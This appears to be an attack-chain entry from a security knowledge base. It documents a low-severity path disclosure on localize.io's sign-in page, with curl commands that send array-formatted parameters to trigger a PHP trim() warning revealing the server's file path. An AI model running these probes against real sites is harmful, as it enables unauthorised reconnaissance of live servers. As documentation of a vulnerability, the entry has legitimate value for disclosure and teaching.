---
id: ac-localize-path-disclosure-7903
tags:
  - information-disclosure
  - php
  - path-disclosure
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Trigger-PHP-Trim-Error-for-Path-Disclosure]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:11.964Z'
description: >-
  Demonstrates information disclosure of server file paths by exploiting PHP
  trim() function with array parameters in the sign-in endpoint of localize.io.
skill_level: beginner
impact_level: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Path Disclosure via Malformed Array Parameters in Localize.io Sign-In

Multi-stage attack chain demonstrating a complete attack workflow for exploiting an information disclosure vulnerability in the sign-in functionality of localize.io.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Load Homepage] --> B[Execution: Submit Malformed Sign-In]
    B --> C[Objective: Path Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP requests, e.g., via curl or browser)

### Target Environment

- Web platform with PHP backend
- Publicly accessible sign-in endpoint at http://www.localize.io/
- No authentication required for initial access

### Initial Access Requirements

- Internet access to the target site
- No credentials needed
- Direct network access to the web server

## Detailed Attack Procedures

### Step 1: Access Homepage
procedure: [[procedures/Trigger-PHP-Trim-Error-for-Path-Disclosure]]

**Objective**: Load the homepage to initiate the sign-in process and ensure the site is responsive.

**Instructions**: Send a GET request to the homepage using [[commands/get-localize-homepage]]:

```bash
curl -X GET http://www.localize.io/
```

**Expected Output**: HTML content of the homepage, including the sign-in form.

**Success Indicators**:
- HTTP 200 response with homepage HTML
- Sign-in form visible in response

### Step 2: Submit Malformed Sign-In Form
procedure: [[procedures/Trigger-PHP-Trim-Error-for-Path-Disclosure]]

**Objective**: Trigger the PHP trim() warning by submitting array-formatted parameters to disclose the internal server file path.

**Instructions**: After accessing the homepage, send a POST request with array notation in parameters using [[commands/post-malformed-signin-localize]]:

```bash
curl -X POST http://www.localize.io/ -d "sign_in[username][]=test&sign_in[password][]=test"
```

**Expected Output**: PHP warning message disclosing the server path, such as "Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 732".

**Success Indicators**:
- Warning message in response body
- Exposure of internal file path like /var/www/vhosts/.../index.php

## Attack Chain Summary

### Key Achievements

1. Successful access to the vulnerable sign-in endpoint without authentication.
2. Triggered information disclosure revealing server hosting details (e.g., dedicated host in Europe).
3. Demonstrated how path disclosure can aid in further reconnaissance or targeted attacks.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---

*Last updated: 2023-10-01T00:00:00Z*
